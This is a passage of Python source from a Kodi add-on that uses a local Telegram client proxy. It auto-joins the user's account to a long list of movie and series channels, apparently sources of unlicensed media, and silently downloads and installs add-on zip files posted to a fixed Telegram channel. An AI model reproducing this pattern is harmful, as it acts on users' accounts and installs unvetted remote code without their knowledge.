             'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ נתי מדיה סרטים
            invite_link="https://t.me/joinchat/AAAAADumPH7RARDHtG0SoA"
            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ נתי מדיה סרטים ישראלים
            # invite_link="https://t.me/joinchat/AAAAAEH4beTG18SsVmQn0Q"
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
             # }
            # event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ נתי מדיה סדרות
            invite_link="https://telegram.me/joinchat/AAAAAEB-codSLnVIPtovVQ"
            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ סדרות ישראליות
            invite_link="https://t.me/joinchat/AAAAAEcrExn4e7Za2M5MKg"
            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
             }
             
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
             #ערוץ קבוצות טלגרם
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat', 'username': '@MyTelegraMediaGroups', '@extra': num})
             }

            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ מדע וטבע
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Nature_Films', '@extra': num})
             }

            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()

            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ עולם הילדים נתי מדיה
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat', 'username': '@NatiMediaHebdub', '@extra': num})
             }

            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()

            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ עולם הילדים מקורי
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@kidsworldglobal', '@extra': num})
             # }

            # event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()

            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
             # }
            # event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ בוט קבצים
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat', 'username': '@allinoneindex', '@extra': num})
             }

            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()

            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ דוקו
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Docuy', '@extra': num})
             }

            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()

            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ סדרות לילדים
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat', 'username': '@mediachildren', '@extra': num})
             }

            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()

            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
 except:pass
#TEST
def joinvialink():

  xbmc.executebuiltin("RunPlugin(plugin://plugin.video.telemedia?mode=136&url=www)")
def joinvialink2():
    
    num=random.randint(1,1001)
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@yair_sratim12345', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@ISRMovies', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@LuluSratimVIP', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@kobisdarott', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@kobisdarott', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@LuluSratimSeries', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@sratimnew', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Shalom_Media_1', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@cinimacity', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@sratimnew1', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@nereya_movies', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@TVShowsAndMovies2502', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@ELIRANGOZLAN2008', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@IL1200', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Danibar2', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    
    
    
    
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@yy4119', '@extra': num})
     }

    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    data={'type':'td_send',
     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
     }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    
    

            
     # if not os.path.exists(os.path.join(user_dataDir, '4.1.0')):
        # #check_updated()
        # file = open(os.path.join(user_dataDir, '4.1.0'), 'w') 
         
        # file.write(str('Done'))
        # file.close()
def search_updatesvip():
    # time.sleep(60.1)
    HOME= xbmc.translatePath('special://home/')
    ADDONS           = os.path.join(HOME,      'addons')
    NAMEWIZARD='Kodi Anonymous'
    if os.path.exists(os.path.join(ADDONS, 'plugin.program.Anonymous')):
        from packaging import version
        id=Addon.getSetting("update_chat_id")
        # joinrepo()
        repoid=-1001497669388
        # testid=-1001486692480
        num=random.randint(0,60000)
        logging.warning('send update')
        all_ids=[repoid]
        for in_ids in all_ids:
            
            logging.warning(in_ids)
           
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchChatMessages','chat_id':(in_ids), 'query': '','from_message_id':0,'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':100, '@extra': num})
                 }
           
           
           
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            logging.warning(json.dumps(event))
            try:
                if 'Chat not found' in event['message']:
                   LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
                   break
                if 'Have no info about the chat' in event['message']:
                   LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
                   break
            except: pass
            for items_in in event['messages']:  
               
                  
                
                  if 'chat_id' in items_in:
                    
                    
                        logging.warning('correct chatid')
                        if 'content' in items_in:
                            items=items_in
                            if 'document' in items_in['content']:
                                logging.warning('correct doc')
                                if 'file_name' in items_in['content']['document']and STARTP2() =='ok':
                                    f_name=items_in['content']['document']['file_name']
                                    
                                    if '.zip' not in f_name:
                                        continue
                                    logging.warning(f_name)
                                    
                                    c_f_name=f_name.split('-')
                                    if len(c_f_name)==0:
                                        continue
                                    c_f_name=c_f_name[0]
                                    if '-' not in f_name:
                                        continue
                                    new_addon_ver=f_name.split('-')[1].replace('.zip','')
                                    logging.warning(f_name)
                                    ex,cur_version=has_addon(c_f_name)
                                    if ex and not 'plugin.video.update' in f_name:
                                       logging.warning('has addon')
                                       
                                       logging.warning(cur_version)
                                       logging.warning(new_addon_ver)
                                       logging.warning(version.parse(cur_version) < version.parse(new_addon_ver))
                                       if version.parse(cur_version) < version.parse(new_addon_ver):
                                        logging.warning('ver higher')
                                        if 1:
                                            xbmc.executebuiltin('Notification(%s, %s, %d)'%(' Ver:%s [COLOR yellow]עדכון הרחבה[/COLOR]'%new_addon_ver,c_f_name, 500))
                                            
                                        link_data={}
                                        link_data['id']=str(items['content']['document']['document']['id'])
                                        link_data['m_id']=items['id']
                                        link_data['c_id']=items['chat_id']
                                        
                                        logging.warning('install_addon')
                                        
                                        install_addon(f_name,json.dumps(link_data),silent=True)
                                        if 1:
                                            xbmc.executebuiltin('Notification(%s, %s, %d)'%('[COLOR yellow]ההרחבה עודכנה[/COLOR]',c_f_name, 500))
                                    if ex and 'plugin.video.update' in f_name:
                                       logging.warning('has addon')
                                       
                                       logging.warning(cur_version)
                                       logging.warning(new_addon_ver)
                                       logging.warning(version.parse(cur_version) < version.parse(new_addon_ver))
                                       if version.parse(cur_version) < version.parse(new_addon_ver):
                                        logging.warning('ver higher')
                                        if 1:
                                            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, NAMEWIZARD),'[COLOR %s]מוריד עדכון למערכת...[/COLOR]' % COLOR2)
                                            
                                        link_data={}
                                        link_data['id']=str(items['content']['document']['document']['id'])
                                        link_data['m_id']=items['id']
                                        link_data['c_id']=items['chat_id']
                                        
                                        logging.warning('install_addon')
                                        
                                        install_fastupdate(f_name,json.dumps(link_data),silent=True)
                                        if 1:
                                            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, NAMEWIZARD),'[COLOR %s]הבילד עודכן![/COLOR]' % COLOR2)
    else:
     LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]לא זמין[/COLOR]' % COLOR2)
     sys.exit()
def search_updatesstartup():
    try:
        time.sleep(60.1)
        # time.sleep(60.1)
        HOME= xbmc.translatePath('special://home/')
        ADDONS           = os.path.join(HOME,      'addons')
        NAMEWIZARD='Kodi Anonymous'
        if os.path.exists(os.path.join(ADDONS, 'plugin.program.Anonymous')):
            from packaging import version
            id=Addon.getSetting("update_chat_id")
            # joinrepo()
            repoid=-1001497669388
            # testid=-1001486692480
            num=random.randint(0,60000)
            logging.warning('send update')
            all_ids=[repoid]
            for in_ids in all_ids:
                
                logging.warning(in_ids)
               
                data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchChatMessages','chat_id':(in_ids), 'query': '','from_message_id':0,'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':100, '@extra': num})
                     }
               
               
               
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                logging.warning(json.dumps(event))
                try:
                    if 'Chat not found' in event['message']:
                       LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
                       all_d=[]

                       all_d=infiniteReceiverbackground(all_d,last_id)
                       break
                    if 'Have no info about the chat' in event['message']:
                       LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
                       all_d=[]

                       all_d=infiniteReceiverbackground(all_d,last_id)
                       break
                except: pass
                for items_in in event['messages']:  
                   
                      
                    
                      if 'chat_id' in items_in:
                        
                        
                            logging.warning('correct chatid')
                            if 'content' in items_in:
                                items=items_in
                                if 'document' in items_in['content']:
                                    logging.warning('correct doc')
                                    if 'file_name' in items_in['content']['document']and STARTP2() =='ok':
                                        f_name=items_in['content']['document']['file_name']
                                        
                                        if '.zip' not in f_name:
                                            continue
                                        logging.warning(f_name)
                                        
                                        c_f_name=f_name.split('-')
                                        if len(c_f_name)==0:
                                            continue
                                        c_f_name=c_f_name[0]
                                        if '-' not in f_name:
                                            continue
                                        new_addon_ver=f_name.split('-')[1].replace('.zip','')
                                        logging.warning(f_name)
                                        ex,cur_version=has_addon(c_f_name)
                                        if ex and not 'plugin.video.update' in f_name:
                                           logging.warning('has addon')
                                           
                                           logging.warning(cur_version)
                                           logging.warning(new_addon_ver)
                                           logging.warning(version.parse(cur_version) < version.parse(new_addon_ver))
                                           if version.parse(cur_version) < version.parse(new_addon_ver):
                                            logging.warning('ver higher')
                                            if 1:
                                                xbmc.executebuiltin('Notification(%s, %s, %d)'%(' Ver:%s [COLOR yellow]עדכון הרחבה[/COLOR]'%new_addon_ver,c_f_name, 500))
                                                
                                            link_data={}
                                            link_data['id']=str(items['content']['document']['document']['id'])
                                            link_data['m_id']=items['id']
                                            link_data['c_id']=items['chat_id']
                                            
                                            logging.warning('install_addon')
                                            
                                            install_addon(f_name,json.dumps(link_data),silent=True)
                                            if 1:
                                                xbmc.executebuiltin('Notification(%s, %s, %d)'%('[COLOR yellow]ההרחבה עודכנה[/COLOR]',c_f_name, 500))
                                        if ex and 'plugin.video.update' in f_name:
                                           logging.warning('has addon')
                                           
                                           logging.warning(cur_version)
                                           logging.warning(new_addon_ver)
                                           logging.warning(version.parse(cur_version) < version.parse(new_addon_ver))
                                           if version.parse(cur_version) < version.parse(new_addon_ver):
                                            logging.warning('ver higher')
                                            if 1:
                                                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, NAMEWIZARD),'[COLOR %s]מוריד עדכון למערכת...[/COLOR]' % COLOR2)
                                                
                                            link_data={}
                                            link_data['id']=str(items['content']['document']['document']['id'])
                                            link_data['m_id']=items['id']
                                            link_data['c_id']=items['chat_id']
                                            
                                            logging.warning('install_addon')
                                            
                                            install_fastupdate(f_name,json.dumps(link_data),silent=True)
                                            if 1:
                                                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, NAMEWIZARD),'[COLOR %s]הבילד עודכן![/COLOR]' % COLOR2)
        else:
         LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]לא זמין[/COLOR]' % COLOR2)
         sys.exit()
    except: pass
def search_updates():
    from packaging import version
    id=Addon.getSetting("update_chat_id")
    num=random.randint(0,60000)
    logging.warning('send update')
    if not Addon.getSetting("update_chat_id")=='':
    
        if ',' in Addon.getSetting("update_chat_id"):
            all_ids=Addon.getSetting("update_chat_id").split(',')
        else:
            all_ids=[Addon.getSetting("update_chat_id")]
        logging.warning(all_ids)
        for in_ids in all_ids:
            
            logging.warning(in_ids)
           
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchChatMessages','chat_id':(in_ids), 'query': '','from_message_id':0,'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':100, '@extra': num})
                 }
           
           
           
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            logging.warning(json.dumps(event))
            try:
                if 'Chat not found' in event['message']:
                   LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
                   all_d=[]

                   all_d=infiniteReceiverbackground(all_d,last_id)
                   break
                   
                if 'Have no info about the chat' in event['message']:
                   LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
                   all_d=[]

                   all_d=infiniteReceiverbackground(all_d,last_id)
                   break
            except: pass
            for items_in in event['messages']:  
               
                  
                
                  if 'chat_id' in items_in:
                    
                    
                        logging.warning('correct chatid')
                        if 'content' in items_in:
                            items=items_in
                            if 'document' in items_in['content']:
                                logging.warning('correct doc')
                                if 'file_name' in items_in['content']['document']:
                                    f_name=items_in['content']['document']['file_name']
                                    
                                    if '.zip' not in f_name:
                                        continue
                                    logging.warning(f_name)
                                    
                                    c_f_name=f_name.split('-')
                                    if len(c_f_name)==0:
                                        continue
                                    c_f_name=c_f_name[0]
                                    if '-' not in f_name:
                                        continue
                                    new_addon_ver=f_name.split('-')[1].replace('.zip','')
                                    logging.warning(f_name)
                                    ex,cur_version=has_addon(c_f_name)
                                    if ex:
                                       logging.warning('has addon')
                                       
                                       logging.warning(cur_version)
                                       logging.warning(new_addon_ver)
                                       logging.warning(version.parse(cur_version) < version.parse(new_addon_ver))
                                       if version.parse(cur_version) < version.parse(new_addon_ver):
                                        logging.warning('ver higher')
                                        if 1:
                                            xbmc.executebuiltin('Notification(%s, %s, %d)'%('[COLOR yellow]New Update[/COLOR] Ver:%s'%new_addon_ver,c_f_name, 500))
                                            
                                        link_data={}
                                        link_data['id']=str(items['content']['document']['document']['id'])
                                        link_data['m_id']=items['id']
                                        link_data['c_id']=items['chat_id']
                                        
                                        logging.warning('install_addon')
                                        
                                        install_addon(f_name,json.dumps(link_data),silent=True)
                                        if 1:
                                            xbmc.executebuiltin('Notification(%s, %s, %d)'%('[COLOR yellow]Update Ok[/COLOR]',c_f_name, 500))
        else:
          if  Addon.getSetting("auto_update")=='false':
                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אין עדכונים[/COLOR]' % COLOR2)

    else:
     # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Telemedia', 'יש להגדיר ערוץ עדכונים')))
     LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להגדיר ערוץ עדכונים[/COLOR]' % COLOR2)

def my_repovip():
    HOME= xbmc.translatePath('special://home/')
    ADDONS           = os.path.join(HOME,      'addons')
    if os.path.exists(os.path.join(ADDONS, 'plugin.program.Anonymous')):
        from packaging import version
        id=Addon.getSetting("update_chat_id")
        repoid=-1001497669388
        num=random.randint(0,60000)
        logging.warning('send update')
        all_ids=[repoid]
        try:
            if os.path.exists(addon_path):
                shutil.rmtree(addon_path)
        except Exception as e:
            logging.warning('error removing folder:'+str(addon_path)+','+str(e))
        if not xbmcvfs.exists(addon_path+'/'):
            os.makedirs(addon_path)
        all_addons={}
        all_repo_info=[]
        for in_ids in all_ids:
            
            logging.warning(in_ids)
           
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchChatMessages','chat_id':(in_ids), 'query': '','from_message_id':0,'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':100, '@extra': num})
                 }
           
           
           
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            try:
                if 'Chat not found' in event['message']:
                   LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
                   all_d=[]

                   all_d=infiniteReceiverbackground(all_d,last_id)
                   break
                if 'Have no info about the chat' in event['message']:
                   LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
                   all_d=[]

                   all_d=infiniteReceiverbackground(all_d,last_id)
                   break
            except: pass
            for items_in in event['messages']:  
               
                  
                
                  if 'chat_id' in items_in:
                    
                    
                        logging.warning('correct chatid')
                        if 'content' in items_in:
                            items=items_in
                            if 'document' in items_in['content']:
                                logging.warning('correct doc')
                                if 'file_name' in items_in['content']['document']:
                                    f_name=items_in['content']['document']['file_name']
                                    c_f_name=f_name.split('-')
                                    if len(c_f_name)==0:
                                        continue
                                    c_f_name=c_f_name[0]
                                    if '.xml' in f_name:
                                        mv_name=os.path.join(addon_path,c_f_name)
                                        num=random.randint(0,60000)
                                        try:
                                            addon=download_photo(items_in['content']['document']['document']['id'],num,c_f_name,mv_name)
                                            file = open(addon, 'r') 
                                            file_data= file.read()
                                            file.close()
                                            all_repo_info.append(file_data)
                                        except:
                                            pass
                                    if '.zip' not in f_name:
                                        continue
                                    
                                    logging.warning(f_name)
                                    
                                    
                                    if '-' not in f_name:
                                        continue
                                    new_addon_ver=f_name.split('-')[1].replace('.zip','')
                                   
                                    size=items['content']['document']['document']['size']
                                    
                                    f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                                    idd=str(items_in['content']['document']['document']['id'])
                                    ex,cur_version=has_addon(c_f_name)
                                    if c_f_name in all_addons:
                                        all_addons[c_f_name].append({'version':new_addon_ver,'ex':ex,'f_name':f_name,'id':idd,'m_id':items_in['id'],'c_id':items_in['id'],'size':str(f_size2)})
                                    else:
                                        
                                        all_addons[c_f_name]=[]
                                        all_addons[c_f_name].append({'version':new_addon_ver,'ex':ex,'f_name':f_name,'id':idd,'m_id':items_in['id'],'c_id':items_in['id'],'size':str(f_size2)})
                                        
        logging.warning('All M')
        m=[]
        for tt in all_repo_info:
            regex='setting f_name="(.+?)" "display_name"="(.+?)" icon="(.+?)" fanart="(.+?)" description="(.+?)"'
            m=m+re.compile(regex,re.DOTALL).findall(tt)
            logging.warning(m)
        all_data_addon={}
        logging.warning('All M')
        for f_name,disp_name,icon,fanart,plot in m:
            logging.warning(plot)
            all_data_addon[f_name]={'disp_name':disp_name,'icon':icon,'fanart':fanart,'plot':plot}
        logging.warning('All I')
        for items in all_addons:
            link_data={}
            name=items
           
            f_lk=json.dumps(all_addons[items])
            f_size2=all_addons[items][0]['size']
            color='white'
            if all_addons[items][0]['ex']==False:
                color='lightblue'
            title=name
            fan=' '
            icon=' '
            plot=' '
            logging.warning(items)
            if items in all_data_addon:
                
                title=all_data_addon[items]['disp_name']
                icon=all_data_addon[items]['icon']
                fan=all_data_addon[items]['fanart']
                plot=all_data_addon[items]['plot']
            addNolink('[COLOR %s]'%color+ title+'[/COLOR]',f_lk ,47,False, iconimage=icon,fan=fan,generes=f_size2,plot=plot,original_title=json.dumps(all_addons))
    else:
     LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]לא זמין[/COLOR]' % COLOR2)
     sys.exit()
def my_repo():
    from packaging import version
    id=Addon.getSetting("update_chat_id")
    num=random.randint(0,60000)
    logging.warning('send update')
    if ',' in Addon.getSetting("update_chat_id"):
        all_ids=Addon.getSetting("update_chat_id").split(',')
    else:
        all_ids=[Addon.getSetting("update_chat_id")]
    try:
        if os.path.exists(addon_path):
            shutil.rmtree(addon_path)
    except Exception as e:
        logging.warning('error removing folder:'+str(addon_path)+','+str(e))
    if not xbmcvfs.exists(addon_path+'/'):
        os.makedirs(addon_path)
    all_addons={}
    all_repo_info=[]
    for in_ids in all_ids:
        
        logging.warning(in_ids)
       
        data={'type':'td_send',
             'info':json.dumps({'@type': 'searchChatMessages','chat_id':(in_ids), 'query': '','from_message_id':0,'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':100, '@extra': num})
             }
       
       
       
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        try:
            if 'Chat not found' in event['message']:
               LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
               break
            if 'Have no info about the chat' in event['message']:
               LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לערוץ העדכונים[/COLOR]' % COLOR2)
               break
        except: pass
        for items_in in event['messages']:  
           
              
            
              if 'chat_id' in items_in:
                
                
                    logging.warning('correct chatid')
                    if 'content' in items_in:
                        items=items_in
                        if 'document' in items_in['content']:
                            logging.warning('correct doc')
                            if 'file_name' in items_in['content']['document']:
                                f_name=items_in['content']['document']['file_name']
                                c_f_name=f_name.split('-')
                                if len(c_f_name)==0:
                                    continue
                                c_f_name=c_f_name[0]
                                if '.xml' in f_name:
                                    mv_name=os.path.join(addon_path,c_f_name)
                                    num=random.randint(0,60000)
                                    try:
                                        addon=download_photo(items_in['content']['document']['document']['id'],num,c_f_name,mv_name)
                                        file = open(addon, 'r') 
                                        file_data= file.read()
                                        file.close()
                                        all_repo_info.append(file_data)
                                    except:
                                        pass
                                if '.zip' not in f_name:
                                    continue
                                
                                logging.warning(f_name)
                                
                                
                                if '-' not in f_name:
                                    continue
                                new_addon_ver=f_name.split('-')[1].replace('.zip','')
                               
                                size=items['content']['document']['document']['size']
                                
                                f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                                idd=str(items_in['content']['document']['document']['id'])
                                ex,cur_version=has_addon(c_f_name)
                                if c_f_name in all_addons:
                                    all_addons[c_f_name].append({'version':new_addon_ver,'ex':ex,'f_name':f_name,'id':idd,'m_id':items_in['id'],'c_id':items_in['id'],'size':str(f_size2)})
                                else:
                                    
                                    all_addons[c_f_name]=[]
